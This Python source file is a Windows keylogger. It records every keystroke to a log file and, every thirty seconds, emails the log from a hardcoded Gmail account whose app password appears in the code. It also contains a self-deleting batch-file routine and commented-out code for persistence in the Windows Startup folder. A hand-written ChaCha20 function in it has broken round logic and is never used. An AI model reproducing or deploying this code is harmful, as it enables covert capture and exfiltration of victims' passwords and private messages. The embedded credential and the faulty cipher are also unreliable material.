from pynput import keyboard
# from watchdog.observers import Observer
# from watchdog.events import FileSystemEventHandler
import os, sys, time, subprocess

# key for ChaCha20
key = [
    0x03020100,
    0x07060504,
    0x0b0a0908,
    0x0f0e0d0c,
    0x13121110,
    0x17161514,
    0x1b1a1918,
    0x1f1e1d1c
]
block = 0

def delete_self():
    path_exe = os.path.realpath(sys.argv[0])  # get absolute path to exe file
    bat = path_exe + ".bat"                   # make a bat file next to exe file

    bat_contents = f"""
        @echo off
        :loop
        del "{path_exe}" >nul 2>&1
        if exist "{path_exe}" goto loop
        del "{bat}" >nul 2>&1
    """

    with open(bat, "w") as f:
        f.write(bat_contents)

    subprocess.Popen([bat], shell=True, creationflags=subprocess.CREATE_NO_WINDOW)

def on_press(key):
    if key == keyboard.Key.esc:
        return False
    
    # current_path = os.path.dirname(sys.executable)
    # path = os.path.dirname(current_path) + "/log.txt"
    path = "log.txt"

    with open(path, "a") as file:
        try:
            file.write(f"{key.char}")
        except AttributeError:
            if key.name == "enter":
                file.write("\n")
            elif key.name == "space":
                file.write(" ")
            else:
                file.write(f"[{key.name}]")

# windows security immediately deletes exe if can send email.
# to send email, needs 2fa with phone number and uses app passwords 
# (this is a vulnerability in my code as the phone number could be tracked down)
import yagmail
def send_email():
    # dont send email if file is small
    if os.path.getsize("log.txt") <    512:
        print("cancel email send")
        return
    
    yag = yagmail.SMTP('xanofoxewa20@gmail.com', 'bvez hsnw ptsr isdd ')
    yag.send('example_email@gmail.com', 'test send email', contents = 'hi', attachments = "log.txt")

    # clears file
    with open("log.txt", "w") as file:
        pass

def rotate_left(value, shift):
    return ((value << shift) & 0xFFFFFFFF) | (value >> (32 - shift))

def quarter_round(matrix, a, b, c, d):
    # column round
    matrix[a] = (matrix[a] + matrix[b]) & 0xFFFFFFFF
    matrix[d] ^= matrix[a]
    matrix[d] = rotate_left(matrix[d], 16)

    matrix[a] = (matrix[c] + matrix[d]) & 0xFFFFFFFF
    matrix[b] ^= matrix[c]
    matrix[b] = rotate_left(matrix[b], 12)

    # diagonal round
    matrix[a] += (matrix[a] + matrix[b]) & 0xFFFFFFFF
    matrix[d] ^= matrix[a]
    matrix[d] = rotate_left(matrix[d], 8)

    matrix[c] += (matrix[c] + matrix[d]) & 0xFFFFFFFF
    matrix[b] ^= matrix[c]
    matrix[b] = rotate_left(matrix[b], 7)


def ChaCha20(nonce):
    matrix = [0] * 16
    matrix[0] = 0x61707865
    matrix[1] = 0x3320646e
    matrix[2] = 0x79622d32
    matrix[3] = 0x6b206574

    # populate the matrix with keys
    for i, word in enumerate(key):
        matrix[4+i] = word

    matrix[12] = block
    matrix[13] = nonce[0]
    matrix[14] = nonce[1]
    matrix[15] = nonce[2]

    original_matrix = matrix.copy()

    # only 10 times because every loop is doing 
    # 1 column round and 1 diagonal round
    for i in range(10):
        quarter_round(matrix,  0,  4,  8, 12)
        quarter_round(matrix,  1,  5,  9, 13)
        quarter_round(matrix,  2,  6, 10, 14)
        quarter_round(matrix,  3,  7, 11, 15)
        quarter_round(matrix,  0,  5, 10, 15)
        quarter_round(matrix,  1,  6, 11, 12)
        quarter_round(matrix,  2,  7,  8, 13)
        quarter_round(matrix,  3,  4,  9, 14)
    
    for i in range(16):
        matrix[i] = (matrix[i] + original_matrix[i]) & 0xFFFFFFFF

    keystream = []
    for word in matrix:
        keystream.append((word) & 0xFF)
        keystream.append((word >> 8) & 0xFF)
        keystream.append((word >> 16) & 0xFF)
        keystream.append((word >> 24) & 0xFF)
    
    return keystream
        

# make program always run at startup
# taken from : https://stackoverflow.com/questions/65844536/making-python-code-run-at-startup-in-windows
# makes a bat file in window's startup folder that runs the current exe file

# import getpass
# USER_NAME = getpass.getuser()

# def add_to_startup():
#     path_exe = os.path.realpath(sys.argv[0])
#     bat_path = r'C:\Users\%s\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup' % USER_NAME
#     with open(bat_path + '\\' + "open.bat", "w+") as bat_file:
#         bat_file.write(f'start "" {path_exe}')

listener = keyboard.Listener(on_press=on_press)
listener.start()

# tries to delete itself.
# listener.join()     # waits for listener to stop listening
        
# directory_path = os.path.dirname(sys.executable)

# time.sleep(2)
# last_access_time = os.stat(directory_path).st_atime

# while True:
#     time.sleep(1)
#     new_access_time = os.stat(directory_path).st_atime
#     if (new_access_time > last_access_time):
#         print(f"last {last_access_time}")
#         print(f"new {new_access_time}")  
#         # delete_self()
#         break

# listener.stop()

i = 0
while (1):
    time.sleep(1)
    i += 1
    if i > 30:
        i = 0
        print("sending email")
        send_email()
        time.sleep(10)
        print("email sent")

print("program over")

# https://github.com/skeeto/chacha-js/blob/master/chacha.js encryption